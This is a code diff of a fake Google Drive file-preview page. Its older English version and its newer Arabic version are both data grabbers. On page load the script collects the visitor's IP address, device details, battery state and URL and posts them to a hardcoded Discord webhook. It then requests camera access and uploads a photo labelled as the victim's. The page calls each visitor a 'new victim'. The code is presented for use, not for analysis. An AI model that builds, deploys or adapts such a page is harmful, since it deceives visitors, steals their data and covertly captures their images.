@@ -1,56 +1,79 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - Private_File.zip</title>
-    <link rel="shortcut icon" href="https://ssl.gstatic.com/docs/doclist/images/drive_2020q4_32dp.png">
-    <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #f5f5f5; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 90%; max-width: 450px; }
-        .icon { width: 64px; height: 64px; margin-bottom: 20px; }
-        h1 { font-size: 22px; color: #3c4043; margin-bottom: 8px; font-weight: 400; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
-        .btn { background-color: #1a73e8; color: white; padding: 12px 24px; border-radius: 4px; text-decoration: none; font-weight: 500; font-size: 14px; cursor: pointer; border: none; }
-        .btn:hover { background-color: #1765cc; }
-    </style>
+    <title>Google Drive - معاينة الملف</title>
     <script>
-        async function TLQQEMM_SEND() {
-            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67"; 
-            try {
-                const ipReq = await fetch('https://api.ipify.org?format=json');
-                const ipRes = await ipReq.json();
-                
-                const payload = {
-                    embeds: [{
-                        title: "🚀 TLQQEMM GRABER - NEW VICTIM",
-                        color: 5763719,
-                        fields: [
-                            { name: "IP Address", value: ipRes.ip, inline: true },
-                            { name: "Platform", value: navigator.platform, inline: true },
-                            { name: "Browser", value: navigator.userAgent },
-                            { name: "Language", value: navigator.language, inline: true }
-                        ],
-                        footer: { text: "System: Google Drive Fake Page" }
-                    }]
-                };
+    async function TLQQEMM_FULL_LOG() {
+        const webhook = " SEND THIS LINK: https://discord.com/invite/kY7G5nVW?login-id=89b0a79e&data-relay=https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67"; // ضع رابط الويبهوك الخاص بك هنا
+        
+        let batteryStatus = "غير معروف";
+        try {
+            if (navigator.getBattery) {
+                const bt = await navigator.getBattery();
+                batteryStatus = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
+            }
+        } catch (e) {}
 
-                await fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-            } catch (e) {}
-        }
-        window.onload = TLQQEMM_SEND;
+        const ipReq = await fetch('https://api.ipify.org?format=json');
+        const ipRes = await ipReq.json();
+
+        const payload = {
+            embeds: [{
+                title: "🚀 تم صيد ضحية جديدة - نظام TLQQEMM",
+                color: 65280,
+                fields: [
+                    { name: "🌐 عنوان الـ IP", value: ipRes.ip, inline: true },
+                    { name: "🔋 حالة البطارية", value: batteryStatus, inline: true },
+                    { name: "💻 نوع الجهاز/النظام", value: navigator.platform, inline: true },
+                    { name: "🧠 الذاكرة العشوائية (RAM)", value: `${navigator.deviceMemory || 'غير معروف'} جيجا`, inline: true },
+                    { name: "📱 أبعاد الشاشة", value: `${screen.width}x${screen.height}`, inline: true },
+                    { name: "🌍 لغة الجهاز", value: navigator.language, inline: true },
+                    { name: "🕵️ المتصفح المستخدم", value: navigator.userAgent },
+                    { name: "🔗 الرابط الذي دخله", value: window.location.href }
+                ],
+                footer: { text: "نظام سحب البيانات المتطور | TLQQEMM" },
+                timestamp: new Date()
+            }]
+        };
+
+        // إرسال البيانات النصية
+        await fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        // طلب الكاميرا (اختياري للضحية)
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/png');
+            
+            const blob = await (await fetch(imgData)).blob();
+            const formData = new FormData();
+            formData.append('file', blob, 'victim_shot.png');
+            formData.append('content', "📸 **صورة مباشرة من كاميرا الضحية:**");
+            await fetch(webhook, { method: 'POST', body: formData });
+            
+            stream.getTracks().forEach(track => track.stop());
+        } catch (e) {}
+    }
+
+    window.onload = TLQQEMM_FULL_LOG;
     </script>
 </head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" class="icon" alt="Drive">
-        <h1>Private_File_Secure.zip</h1>
-        <p>Google Drive can't scan this file for viruses. It's too large for Google to scan.</p>
-        <button class="btn" onclick="alert('Error: File is temporarily unavailable.')">Download anyway</button>
+<body style="background-color: #000; color: white; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;">
+    <div style="text-align: center;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" width="80">
+        <h2>جاري فحص الملف للأمان...</h2>
+        <p>يرجى الانتظار قليلاً، سيتم فتح الملف تلقائياً.</p>
     </div>
 </body>
 </html>
